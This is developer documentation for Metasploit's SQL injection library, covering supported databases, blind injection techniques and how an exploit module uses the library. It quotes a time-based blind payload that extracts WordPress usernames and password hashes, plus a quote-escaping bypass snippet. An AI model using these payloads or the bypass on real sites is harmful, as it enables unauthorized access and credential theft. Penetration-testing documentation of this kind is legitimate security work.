SQL Injection library support was added in 2020 by [@red0xff](https://github.com/red0xff)  during the Google Summer of Code.

## Supported Databases

* MySQL/MariaDB ([#13596](https://github.com/rapid7/metasploit-framework/pull/13596))
* SQLite ([#13847](https://github.com/rapid7/metasploit-framework/pull/13847))
* PostgreSQL ([#14067](https://github.com/rapid7/metasploit-framework/pull/14067))

## Supported Techniques

* Boolean Based Blind
* Time Based Blind

|                     | MySQL/MariaDB | SQLite | Postgres |
|---------------------|---------------|--------|----------|
| Boolean Based Blind | X             | X      | X        |
| Time Based Blind    | X             | X      | X        |

## How to use in a module

You'll need to start off by including the library.

```ruby
include Msf::Exploit::SQLi
```

Next we create our SQLi object:

```ruby
sqli = create_sqli(dbms: MySQLi::Common, opts: sqli_opts) do |payload|
  # Here is where we write in what to do each request using #{payload} as the spot to inject
end
```

`dbms` can be set to either `Common` if the DB isn't know, or one of the other databases and methods if it is known ahead of time such as `SQLitei::BooleanBasedBlind`
`sqli_opts` is a hash containing all of the [options](https://github.com/rapid7/metasploit-framework/blob/master/lib/msf/core/exploit/sqli/common.rb#L12).

## Notes

### run_sql

`run_sql` can only return 1 column.

### magic_quotes bypass

*CAN ONLY RETURN ONE COLUMN AT A TIME*

At times, PHP will use `magic_quotes` to escape `'` and `"`.  This may cause problems in the SQL injection. You'll know its a problem, because you'll see log items like this:

```
[Sat Jan 02 14:11:53.103512 2021] [php7:notice] [pid 55607] [client 2.2.2.2:36475] WordPress database error You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near '\\';\\',ifnull(user_login,\\'\\'),ifnull(user_pass,\\'\\')) as binary) mMJZrCxQ from w' at line 1 for query SELECT * FROM wp_chopslider3 WHERE chopslider_id =938076279 OR 1=1 AND if(length(cast((select group_concat(mMJZrCxQ) from (select cast(concat_ws(\\';\\',ifnull(user_login,\\'\\'),ifnull(user_pass,\\'\\')) as binary) mMJZrCxQ from wp_users limit 1) fWLwo) as binary))&1<>0,sleep(1.0),0)
```

However, the query was similar to this:

```
[*] {SQLi} Executing (select group_concat(qcO) from (select cast(concat_ws(';',to_base64(ifnull(user_login,'')),to_base64(ifnull(user_pass,''))) as binary) qcO from wp_users limit 1) dTWyw)
```

The query was sent without the escapes, however they were added.  The solution is to avoid quotes at all.  To do this, we will need to use  the `hex` encoder

```ruby
if payload.include?("''")
  payload.gsub!("''", 'hex(0x00)')
end
```

This will convert all instances of `''` which were previously being escaped to `\'\'` to `hex(0x00)` which does not get altered.
